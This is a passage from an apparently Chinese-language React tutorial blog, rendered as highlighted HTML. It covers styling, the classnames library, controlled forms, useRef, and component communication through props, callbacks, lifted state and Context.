punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>handleClick<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>changeForm<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">修改form</span><span class="token punctuation">{</span>form<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="七、样式控制"><a href="#七、样式控制" class="headerlink" title="七、样式控制"></a>七、样式控制</h1><h2 id="7-1-行内样式（不推荐）"><a href="#7-1-行内样式（不推荐）" class="headerlink" title="7.1 行内样式（不推荐）"></a>7.1 行内样式（不推荐）</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.06.47.png" style="zoom:50%;"><h2 id="7-2-类名控制样式（单独css文件）"><a href="#7-2-类名控制样式（单独css文件）" class="headerlink" title="7.2 类名控制样式（单独css文件）"></a>7.2 类名控制样式（单独css文件）</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-10%2018.07.23.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 导入样式</span><span class="token keyword">import</span> <span class="token string">'./index.css'</span><span class="token keyword">const</span> style <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">,</span>  <span class="token literal-property property">fontSize</span><span class="token operator">:</span> <span class="token string">'50px'</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 行内样式控制 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>style<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token punctuation">{</span><span class="token comment">/* 通过class类名控制 */</span><span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>foo<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is class foo</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.foo</span> <span class="token punctuation">{</span>  <span class="token property">color</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="八、classnames动态控制类名"><a href="#八、classnames动态控制类名" class="headerlink" title="八、classnames动态控制类名"></a>八、classnames动态控制类名</h1><h2 id="8-1-安装classnames库"><a href="#8-1-安装classnames库" class="headerlink" title="8.1 安装classnames库"></a>8.1 安装classnames库</h2><p>classnames是一个简单的JS库，可以非常方便的通过条件动态控制class类名的显示。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> classnames<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-2-使用"><a href="#8-2-使用" class="headerlink" title="8.2 使用"></a>8.2 使用</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.03.39.png" alt="原始的模版字符串方式" style="zoom:50%;"><p>问题：字符串的拼接方式不够直观，也容易出错。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2016.04.36.png" alt="调用classNames()函数" style="zoom:67%;"><h1 id="九、受控表单绑定"><a href="#九、受控表单绑定" class="headerlink" title="九、受控表单绑定"></a>九、受控表单绑定</h1><p>概念：使用React组件的状态（useState）控制表单的状态。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.11.25.png" style="zoom:50%;"><p>1）准备一个React状态值</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）通过value属性绑定状态，通过onChange属性绑定状态同步的函数</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2017.13.58.png" style="zoom:50%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 受控绑定表单</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. 声明一个react状态 - useState</span><span class="token comment">// 2. 核心绑定流程</span><span class="token comment">// 1. 通过value属性绑定react状态</span><span class="token comment">// 2. 绑定onChange事件 通过事件参数e拿到输入框最新的值 反向修改到react状态身上</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>value<span class="token punctuation">,</span> setValue<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span>        <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>value<span class="token punctuation">}</span></span>        <span class="token attr-name">onChange</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setValue</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="十、React获取DOM元素"><a href="#十、React获取DOM元素" class="headerlink" title="十、React获取DOM元素"></a>十、React获取DOM元素</h1><p>在 React 组件中获取/操作 DOM，需要使用 useRef React Hook钩子函数，分为两步：</p><ol><li>使用useRef创建 ref 对象，并与 JSX 绑定</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.21.png" style="zoom:40%;"><ol start="2"><li>在DOM可用时，通过 inputRef.current 拿到 DOM 对象</li></ol><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-16%2018.12.52.png" style="zoom:40%;"><h1 id="十一、组件通信"><a href="#十一、组件通信" class="headerlink" title="十一、组件通信"></a>十一、组件通信</h1><h2 id="11-1-组件通信的概念"><a href="#11-1-组件通信的概念" class="headerlink" title="11.1 组件通信的概念"></a>11.1 组件通信的概念</h2><p>概念：组件通信就是组件之间的数据传递，根据组件嵌套关系的不同，有不同的通信方法。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.41.28.png" alt="截屏2024-12-17 17.41.28" style="zoom:50%;"><h2 id="11-2-父子组件通信"><a href="#11-2-父子组件通信" class="headerlink" title="11.2 父子组件通信"></a>11.2 父子组件通信</h2><h3 id="11-2-1-父传子"><a href="#11-2-1-父传子" class="headerlink" title="11.2.1 父传子"></a>11.2.1 父传子</h3><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.42.14.png" style="zoom:50%;"><p>实现步骤：</p><ol><li>父组件传递数据 —— 在子组件标签上绑定属性。</li><li>子组件接收数据 —— 子组件通过props参数接收数据。</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 父传子</span><span class="token comment">// 1. 父组件传递数据  子组件标签身上绑定属性</span><span class="token comment">// 2. 子组件接收数据  props的参数</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter">props</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// props：对象里面包含了父组件传递过来的所有的数据</span>  <span class="token comment">// { name:'父组件中的数据'}</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>props<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is son, </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>name<span class="token punctuation">}</span><span class="token plain-text">, jsx: </span><span class="token punctuation">{</span>props<span class="token punctuation">.</span>child<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is app name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span>        <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span>        <span class="token attr-name">age</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token number">18</span><span class="token punctuation">}</span></span>        <span class="token attr-name">isTrue</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token boolean">false</span><span class="token punctuation">}</span></span>        <span class="token attr-name">list</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">[</span><span class="token string">'vue'</span><span class="token punctuation">,</span> <span class="token string">'react'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>        <span class="token attr-name">obj</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'jack'</span> <span class="token punctuation">}</span><span class="token punctuation">}</span></span>        <span class="token attr-name">cb</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span>        <span class="token attr-name">child</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">this is span</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">}</span></span>      <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>props说明</li></ul><ol><li>props可传递任意的数据</li></ol><p>​数字、字符串、布尔值、数组、对象、函数、JSX</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2017.56.22.png" style="zoom:50%;"><ol start="2"><li><p>props是只读对象</p><p>子组件只能读取props中的数据，不能直接进行修改, 父组件的数据只能由父组件修改</p></li><li><p>特殊的prop children</p></li></ol><p>​场景：当我们把内容嵌套在子组件标签中时，父组件会自动在名为children的prop属性中接收该内容.</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.02.png" style="zoom:50%;"><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-17%2018.08.18.png" alt="截屏2024-12-17 18.08.18" style="zoom:50%;"><h2 id="11-3-子传父"><a href="#11-3-子传父" class="headerlink" title="11.3 子传父"></a>11.3 子传父</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.10.png" style="zoom:50%;"><p>核心思路：在子组件中调用父组件中的函数并传递参数。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-18%2017.59.37.png" style="zoom:40%;"><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 核心：在子组件中调用父组件中的函数并传递实参</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token function">Son</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetSonMsg <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Son组件中的数据</span>  <span class="token keyword">const</span> sonMsg <span class="token operator">=</span> <span class="token string">'this is son msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is Son      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetSonMsg</span><span class="token punctuation">(</span>sonMsg<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">sendMsg</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>msg<span class="token punctuation">,</span> setMsg<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getMsg</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token function">setMsg</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App, </span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Son</span></span> <span class="token attr-name">onGetSonMsg</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getMsg<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-4-兄弟组件通信"><a href="#11-4-兄弟组件通信" class="headerlink" title="11.4 兄弟组件通信"></a>11.4 兄弟组件通信</h2><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.43.25.png" style="zoom:50%;"><p>实现思路：借助“状态提升”机制，通过父组件进行兄弟组件之间的数据传递</p><ol><li>A组件先通过子传父的方式把数据传给父组件App</li><li>App拿到数据后通过父传子的方式再传递给B组件</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// 1. 通过子传父 A -&gt; App</span><span class="token comment">// 2. 通过父传子 App -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> useState <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> onGetAName <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Son组件中的数据</span>  <span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token string">'this is A name'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A compnent,      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">onGetAName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">send</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> name <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,      </span><span class="token punctuation">{</span>name<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>name<span class="token punctuation">,</span> setName<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> <span class="token function-variable function">getAName</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is App      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token attr-name">onGetAName</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>getAName<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token attr-name">name</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="11-5-跨层级组件通信"><a href="#11-5-跨层级组件通信" class="headerlink" title="11.5 跨层级组件通信"></a>11.5 跨层级组件通信</h2><p>使用Context机制跨层级组件通信。</p><img src="/2024/12/09/qian-hou-duan-kai-fa/react-qian-duan-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-23%2017.52.00.png" style="zoom:50%;"><p>实现步骤：</p><ol><li>使用createContext方法创建一个上下文对象Ctx。</li><li>在顶层组件（App）中通过 Ctx.Provider 组件提供数据。</li><li>在底层组件（B）中通过 useContext 钩子函数获取消费数据。</li></ol><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token comment">// App -&gt; A -&gt; B</span><span class="token keyword">import</span> <span class="token punctuation">{</span> createContext<span class="token punctuation">,</span> useContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token comment">// 1. createContext方法创建一个上下文对象</span><span class="token keyword">const</span> MsgContext <span class="token operator">=</span> <span class="token function">createContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 2. 在顶层组件 通过Provider组件提供数据</span><span class="token comment">// 3. 在底层组件 通过useContext钩子函数使用数据</span><span class="token keyword">function</span> <span class="token constant">A</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is A component      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">B</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token constant">B</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token function">useContext</span><span class="token punctuation">(</span>MsgContext<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      this is B compnent,</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">App</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> <span class="token string">'this is app msg'</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">MsgContext.Provider</span></span> <span class="token attr-name">value</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">        this is App        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">A</span></span> <span class="token punctuation">/&gt;</span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">MsgContext.Provider</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">default</span> App<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要存在顶层和底层的关系都可以使用Context来进行通信。</p><img 